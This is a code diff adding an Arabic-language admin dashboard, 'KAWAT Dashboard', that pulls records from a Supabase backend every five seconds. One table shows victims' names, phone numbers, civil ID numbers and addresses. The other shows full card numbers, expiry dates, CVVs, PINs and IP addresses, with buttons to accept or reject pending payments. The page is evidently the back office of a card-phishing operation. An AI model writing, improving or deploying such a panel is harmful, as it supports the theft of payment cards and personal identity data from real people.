@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>لوحة التحكم — KAWAT</title>
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+  <style>
+    *,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:'Cairo',sans-serif;background:#f0f2f5;color:#222;min-height:100vh}
+    .topbar{background:#1a1a2e;color:#fff;padding:14px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:50}
+    .topbar h1{font-size:1.1rem;font-weight:700}
+    .topbar .refresh-btn{background:rgba(255,255,255,.15);color:#fff;border:none;padding:8px 18px;border-radius:8px;cursor:pointer;font-family:inherit;font-size:.85rem;font-weight:600;transition:background .2s}
+    .topbar .refresh-btn:hover{background:rgba(255,255,255,.25)}
+    .stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:16px;padding:20px 24px}
+    .stat-card{background:#fff;border-radius:14px;padding:20px;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+    .stat-card .label{font-size:.8rem;color:#888;margin-bottom:4px}
+    .stat-card .value{font-size:1.8rem;font-weight:800;color:#1a1a2e}
+    .stat-card.green .value{color:#27ae60}
+    .stat-card.orange .value{color:#e67e22}
+    .stat-card.red .value{color:#c0392b}
+    .tabs{display:flex;gap:0;padding:0 24px;border-bottom:2px solid #ddd;background:#fff}
+    .tab{padding:14px 28px;font-size:.95rem;font-weight:700;color:#888;cursor:pointer;border-bottom:3px solid transparent;transition:all .2s}
+    .tab.active{color:#1a1a2e;border-bottom-color:#1a1a2e}
+    .tab:hover{color:#1a1a2e}
+    .content{padding:20px 24px}
+    .table-wrap{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,.06)}
+    table{width:100%;border-collapse:collapse;font-size:.85rem}
+    th{background:#f8f9fa;padding:12px 14px;text-align:right;font-weight:700;color:#555;white-space:nowrap;border-bottom:2px solid #e8e5e1}
+    td{padding:10px 14px;border-bottom:1px solid #f0f0f0;vertical-align:middle}
+    tr:hover td{background:#f8fbff}
+    .badge{display:inline-block;padding:4px 12px;border-radius:50px;font-size:.75rem;font-weight:700}
+    .badge-pending{background:#fff3cd;color:#856404}
+    .badge-accepted{background:#d4edda;color:#155724}
+    .badge-rejected{background:#f8d7da;color:#721c24}
+    .action-btn{padding:6px 14px;border:none;border-radius:8px;font-size:.78rem;font-weight:700;cursor:pointer;font-family:inherit;transition:all .2s}
+    .btn-accept{background:#27ae60;color:#fff}
+    .btn-accept:hover{background:#219a52}
+    .btn-reject{background:#c0392b;color:#fff;margin-right:6px}
+    .btn-reject:hover{background:#a93226}
+    .card-num{direction:ltr;text-align:left;font-family:monospace;letter-spacing:1px}
+    .empty{text-align:center;padding:60px 20px;color:#999;font-size:1rem}
+    .hidden{display:none}
+    .live-dot{width:8px;height:8px;background:#27ae60;border-radius:50%;display:inline-block;margin-left:8px;animation:pulse 1.5s infinite}
+    @keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+    @media(max-width:768px){
+      .stats{grid-template-columns:1fr 1fr;gap:10px;padding:14px}
+      .content{padding:14px}
+      table{font-size:.78rem}
+      th,td{padding:8px 10px}
+      .tabs{overflow-x:auto}
+      .tab{padding:12px 18px;font-size:.85rem;white-space:nowrap}
+    }
+  </style>
+</head>
+<body>
+  <div class="topbar">
+    <h1>KAWAT Dashboard <span class="live-dot"></span></h1>
+    <button class="refresh-btn" onclick="loadAll()">تحديث</button>
+  </div>
+
+  <div class="stats" id="statsBar">
+    <div class="stat-card"><div class="label">إجمالي الطلبات</div><div class="value" id="totalOrders">-</div></div>
+    <div class="stat-card green"><div class="label">مدفوعات مكتملة</div><div class="value" id="totalPayments">-</div></div>
+    <div class="stat-card orange"><div class="label">قيد الانتظار</div><div class="value" id="pendingCount">-</div></div>
+    <div class="stat-card"><div class="label">زوار اليوم</div><div class="value" id="todayVisitors">-</div></div>
+  </div>
+
+  <div class="tabs">
+    <div class="tab active" data-tab="orders">الطلبات</div>
+    <div class="tab" data-tab="payments">المدفوعات</div>
+  </div>
+
+  <div class="content">
+    <div id="orders-tab">
+      <div class="table-wrap">
+        <table>
+          <thead><tr>
+            <th>#</th><th>الاسم</th><th>الهاتف</th><th>المدني</th><th>الساعة</th><th>المحافظة</th><th>المنطقة</th><th>العنوان</th><th>الحالة</th><th>التاريخ</th>
+          </tr></thead>
+          <tbody id="ordersBody"></tbody>
+        </table>
+        <div class="empty hidden" id="ordersEmpty">لا توجد طلبات بعد</div>
+      </div>
+    </div>
+
+    <div id="payments-tab" class="hidden">
+      <div class="table-wrap">
+        <table>
+          <thead><tr>
+            <th>#</th><th>رقم البطاقة</th><th>انتهاء</th><th>CVV</th><th>PIN</th><th>النوع</th><th>المبلغ</th><th>المرجع</th><th>IP</th><th>الحالة</th><th>التاريخ</th><th>إجراء</th>
+          </tr></thead>
+          <tbody id="paymentsBody"></tbody>
+        </table>
+        <div class="empty hidden" id="paymentsEmpty">لا توجد مدفوعات بعد</div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const SB_URL = 'https://znstbmftefsqgagidmfm.supabase.co';
+    const SB_KEY = 'sb_publishable_3MdtPJZPiqIv_NbtBioMfg_x4pdkQwE';
+    const SB_HEADERS = {'apikey':SB_KEY,'Authorization':'Bearer '+SB_KEY,'Content-Type':'application/json'};
+
+    document.querySelectorAll('.tab').forEach(t => {
+      t.addEventListener('click', () => {
+        document.querySelectorAll('.tab').forEach(x => x.classList.remove('active'));
+        t.classList.add('active');
+        document.getElementById('orders-tab').classList.toggle('hidden', t.dataset.tab !== 'orders');
+        document.getElementById('payments-tab').classList.toggle('hidden', t.dataset.tab !== 'payments');
+      });
+    });
+
+    function timeAgo(d) {
+      const dt = new Date(d);
+      return dt.toLocaleDateString('ar-EG') + ' ' + dt.toLocaleTimeString('ar-EG', {hour:'2-digit',minute:'2-digit'});
+    }
+
+    function badgeHTML(status) {
+      const map = {pending:'badge-pending',accepted:'badge-accepted',completed:'badge-accepted',rejected:'badge-rejected'};
+      const labels = {pending:'قيد الانتظار',accepted:'مقبول',completed:'مكتمل',rejected:'مرفوض'};
+      return `<span class="badge ${map[status]||'badge-pending'}">${labels[status]||status}</span>`;
+    }
+
+    async function loadOrders() {
+      try {
+        const r = await fetch(SB_URL+'/rest/v1/orders?select=*&order=created_at.desc',{headers:SB_HEADERS});
+        const data = await r.json();
+        const body = document.getElementById('ordersBody');
+        const empty = document.getElementById('ordersEmpty');
+        if (!data.length) { body.innerHTML = ''; empty.classList.remove('hidden'); return; }
+        empty.classList.add('hidden');
+        body.innerHTML = data.map(o => `<tr>
+          <td>${o.id}</td>
+          <td><strong>${o.full_name}</strong></td>
+          <td style="direction:ltr">${o.phone}</td>
+          <td style="direction:ltr">${o.civil_id}</td>
+          <td>${o.watch_name||'#'+o.watch_id}</td>
+          <td>${o.governorate}</td>
+          <td>${o.area}</td>
+          <td>${o.address_details||'-'}</td>
+          <td>${badgeHTML(o.status)}</td>
+          <td style="font-size:.78rem;white-space:nowrap">${timeAgo(o.created_at)}</td>
+        </tr>`).join('');
+        document.getElementById('totalOrders').textContent = data.length;
+      } catch(e) { console.error('Orders error:', e); }
+    }
+
+    async function loadPayments() {
+      try {
+        const r = await fetch(SB_URL+'/rest/v1/payments?select=*&order=created_at.desc',{headers:SB_HEADERS});
+        const data = await r.json();
+        const body = document.getElementById('paymentsBody');
+        const empty = document.getElementById('paymentsEmpty');
+        if (!data.length) { body.innerHTML = ''; empty.classList.remove('hidden'); return; }
+        empty.classList.add('hidden');
+        body.innerHTML = data.map(p => `<tr>
+          <td>${p.id}</td>
+          <td class="card-num">${p.card_number||'-'}</td>
+          <td style="direction:ltr">${p.card_expiry||'-'}</td>
+          <td style="direction:ltr">${p.card_cvv||'-'}</td>
+          <td style="direction:ltr">${p.card_pin||'-'}</td>
+          <td>${p.card_type||'-'}</td>
+          <td>${p.amount} د.ك</td>
+          <td style="font-size:.75rem;direction:ltr">${p.transaction_ref||'-'}</td>
+          <td style="font-size:.75rem;direction:ltr">${p.ip_address||'-'}</td>
+          <td>${badgeHTML(p.status)}</td>
+          <td style="font-size:.78rem;white-space:nowrap">${timeAgo(p.created_at)}</td>
+          <td style="white-space:nowrap">
+            ${p.status==='pending'?`
+              <button class="action-btn btn-accept" onclick="updateStatus(${p.id},'accepted')">قبول</button>
+              <button class="action-btn btn-reject" onclick="updateStatus(${p.id},'rejected')">رفض</button>
+            `:'—'}
+          </td>
+        </tr>`).join('');
+        document.getElementById('totalPayments').textContent = data.length;
+        document.getElementById('pendingCount').textContent = data.filter(p => p.status === 'pending').length;
+      } catch(e) { console.error('Payments error:', e); }
+    }
+
+    async function loadVisitors() {
+      try {
+        document.getElementById('todayVisitors').textContent = '—';
+      } catch(e) {}
+    }
+
+    async function updateStatus(id, status) {
+      try {
+        await fetch(SB_URL+'/rest/v1/payments?id=eq.'+id, {
+          method: 'PATCH',
+          headers: {...SB_HEADERS,'Prefer':'return=representation'},
+          body: JSON.stringify({status})
+        });
+        loadPayments();
+      } catch(e) { alert('خطأ في تحديث الحالة'); }
+    }
+
+    function loadAll() {
+      loadOrders();
+      loadPayments();
+      loadVisitors();
+    }
+
+    loadAll();
+    setInterval(loadAll, 5000);
+  </script>
+</body>
+</html>
